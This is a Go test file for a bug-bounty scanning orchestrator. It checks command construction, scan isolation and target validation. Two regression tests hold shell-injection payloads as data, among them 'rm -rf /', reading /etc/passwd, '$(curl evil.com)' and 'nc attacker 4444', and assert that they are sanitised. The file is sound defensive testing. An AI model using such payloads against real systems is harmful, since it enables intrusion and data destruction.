package tools

import (
	"strings"
	"testing"
)

// handledElsewhere lists tools that use the default executor case intentionally.
var handledElsewhere = map[string]bool{
	"afrog":        true, // Python agent
	"dalfox":       true, // inline in gf pipeline
	"kxss":         true, // inline in gf pipeline
	"interactsh":   true, // Python agent OOB
	"cors-engine":  true, // Native Go executeNativeTool()
	"notify":       true, // inline in multiple tools
	"byp4xx":       true, // inline in nomore403-smart
	"dnsvalidator": true, // covered by puredns
}

func TestBuildCommand_AllTools(t *testing.T) {
	r := NewRegistry()
	ctx := BuildContext{
		Target: "testphp.vulnweb.com",
		ScanID: "abcd1234efgh5678",
		OutDir: "/tmp/bbounty-test",
		Scope:  []string{"testphp.vulnweb.com"},
	}
	for _, tool := range r.All() {
		tool := tool
		t.Run(tool.ID, func(t *testing.T) {
			cmd := BuildCommand(tool, ctx)
			if strings.TrimSpace(cmd) == "" {
				t.Errorf("[%s] BuildCommand returned empty string", tool.ID)
				return
			}
			isDefault := cmd == tool.BinaryPath+" "+ctx.Target+" 2>&1"
			if isDefault && !handledElsewhere[tool.ID] {
				t.Errorf("[%s] using default fallback — needs dedicated case: %s",
					tool.ID, cmd[:minI(len(cmd), 80)])
			}
			for _, bad := range []string{"TARGET_PLACEHOLDER", "%!s(MISSING)", "%!(EXTRA"} {
				if strings.Contains(cmd, bad) {
					t.Errorf("[%s] unsubstituted placeholder: %s", tool.ID, bad)
				}
			}
			t.Logf("[%s] OK: %s", tool.ID, cmd[:minI(len(cmd), 60)])
		})
	}
}

func TestBuildCommand_Deterministic(t *testing.T) {
	r := NewRegistry()
	ctx := BuildContext{Target: "example.com", ScanID: "abcd1234efgh5678", OutDir: "/tmp/test", Scope: []string{"example.com"}}
	for _, tool := range r.All() {
		first := BuildCommand(tool, ctx)
		second := BuildCommand(tool, ctx)
		if first != second {
			t.Errorf("[%s] non-deterministic output", tool.ID)
		}
	}
}

func TestBuildCommand_ScanIsolation(t *testing.T) {
	r := NewRegistry()
	base := BuildContext{Target: "a.com", OutDir: "/tmp/test", Scope: []string{"a.com"}}
	ctx1 := base
	ctx1.ScanID = "scan1111aaaa1111"
	ctx2 := base
	ctx2.ScanID = "scan2222bbbb2222"
	for _, tool := range r.All() {
		cmd1 := BuildCommand(tool, ctx1)
		cmd2 := BuildCommand(tool, ctx2)
		if cmd1 == cmd2 {
			if strings.Contains(cmd1, "scan1111") || strings.Contains(cmd2, "scan2222") {
				t.Errorf("[%s] same output path for different scans!", tool.ID)
			}
		}
	}
}

func TestAllToolsHaveTimeout(t *testing.T) {
	r := NewRegistry()
	for _, tool := range r.All() {
		if tool.Timeout <= 0 {
			t.Errorf("[%s] no timeout set", tool.ID)
		}
		if tool.Timeout > 7200 {
			t.Errorf("[%s] timeout %ds > 2h", tool.ID, tool.Timeout)
		}
	}
}

func TestAllToolsHaveROI(t *testing.T) {
	r := NewRegistry()
	for _, tool := range r.All() {
		if tool.ROI == ROIRating(0) {
			t.Errorf("[%s] no ROI rating set", tool.ID)
		}
	}
}

func TestBuildCommand_NoShellInjection(t *testing.T) {
	r := NewRegistry()
	tool, ok := r.Get("subfinder")
	if !ok {
		t.Skip("subfinder not in registry")
	}
	injections := []struct{ target, bad string }{
		{"target.com; rm -rf /", "; rm"},
		{"target.com && id", "&& id"},
		{"target.com|cat /etc/passwd", "|cat"},
		{"target.com`id`", "`id`"},
		{"$(curl evil.com) .com", "$(curl"},
	}
	for _, inj := range injections {
		ctx := BuildContext{Target: inj.target, ScanID: "abcd1234efgh5678", OutDir: "/tmp", Scope: []string{inj.target}}
		cmd := BuildCommand(tool, ctx)
		if strings.Contains(cmd, inj.bad) {
			t.Errorf("injection not sanitized: %q in cmd: %s", inj.bad, cmd[:minI(len(cmd), 100)])
		}
	}
}

// TestBuildCommand_BBountyAgentScopeInjection is the regression test for V-1
// (CVE-class command injection / RCE). The bbounty-agent command interpolates
// the scope list into a `bash -c` line. Scope entries are user-controlled and
// the ROE gate only validates scope *semantics* (target-in-scope), not shell
// safety, so the executor MUST pass scope through SafeScope before interpolating.
// A scope entry such as "x$(id)" — where the target itself is in-scope — must
// never reach the constructed command line.
func TestBuildCommand_BBountyAgentScopeInjection(t *testing.T) {
	// Point at a real-looking path so BuildCommand emits the command rather than
	// the "agent script not found" fallback.
	t.Setenv("BBOUNTY_AGENT_SCRIPT", "/opt/bbounty/agent.py")

	r := NewRegistry()
	tool, ok := r.Get("bbounty-agent")
	if !ok {
		t.Skip("bbounty-agent not in registry")
	}

	ctx := BuildContext{
		Target: "api.example.com",
		ScanID: "abcd1234efgh5678",
		OutDir: "/tmp/bbounty-test",
		// First entry is legitimate (and matches the target, so the ROE gate
		// would pass); the rest are injection payloads that must be stripped.
		Scope: []string{
			"api.example.com",
			"x$(id > /tmp/pwned)",
			"evil.com; rm -rf /",
			"`whoami`.example.com",
			"a|nc attacker 4444",
		},
	}

	cmd := BuildCommand(tool, ctx)
	if strings.TrimSpace(cmd) == "" {
		t.Fatalf("BuildCommand returned empty string for bbounty-agent")
	}
	// The benign entry survives…
	if !strings.Contains(cmd, "api.example.com") {
		t.Errorf("legitimate scope entry was dropped: %s", cmd)
	}
	// …and not one metacharacter payload does.
	for _, bad := range []string{"$(id", "rm -rf", "`whoami`", "nc attacker", "; rm", "|nc"} {
		if strings.Contains(cmd, bad) {
			t.Errorf("scope injection survived into bbounty-agent command: %q present in: %s", bad, cmd)
		}
	}
}

func TestBuildCommand_OutputFileIsolation(t *testing.T) {
	r := NewRegistry()
	ctx1 := BuildContext{Target: "a.com", ScanID: "aaaa1111bbbb2222", OutDir: "/tmp/test", Scope: []string{"a.com"}}
	ctx2 := BuildContext{Target: "a.com", ScanID: "cccc3333dddd4444", OutDir: "/tmp/test", Scope: []string{"a.com"}}
	for _, toolID := range []string{"nuclei", "subfinder", "httpx", "naabu", "ffuf", "sqlmap"} {
		tool, ok := r.Get(toolID)
		if !ok {
			continue
		}
		if BuildCommand(tool, ctx1) == BuildCommand(tool, ctx2) {
			t.Errorf("[%s] identical commands for different scans — output collision risk", toolID)
		}
	}
}

func TestSafeTarget_RejectsInvalid(t *testing.T) {
	for _, target := range []string{
		"169.254.169.254", "localhost", "127.0.0.1", "::1",
		"192.168.1.1", "10.0.0.1", "metadata.google.internal",
	} {
		// SafeTarget returns empty string for blocked targets
		if SafeTarget(target) != "" {
			t.Errorf("SafeTarget(%q) should be blocked, got non-empty", target)
		}
	}
}

func TestSafeTarget_AcceptsValid(t *testing.T) {
	for _, target := range []string{
		"testphp.vulnweb.com", "example.com",
		"api.target.com", "sub.domain.co.uk",
	} {
		if SafeTarget(target) == "" {
			t.Errorf("SafeTarget(%q) should be accepted, got empty", target)
		}
	}
}

func TestAllToolsCount(t *testing.T) {
	r := NewRegistry()
	got := len(r.All())
	// 82 = 79 prior + 3 NucleiFuzzer-chain tools (v3.3.4): uro, gau, nuclei-fuzz.
	// (67 active subprocess + 1 native cors-engine + 1 AGPL-gated vigolium
	//  + 10 deprecated-but-registered + 3 new.)
	// See ORCHESTRATOR_TOOL_INTEGRATION.md for the deprecation rationale.
	if got != 82 {
		t.Errorf("tool count: got %d, want 82", got)
	}
}

func minI(a, b int) int {
	if a < b {
		return a
	}
	return b
}
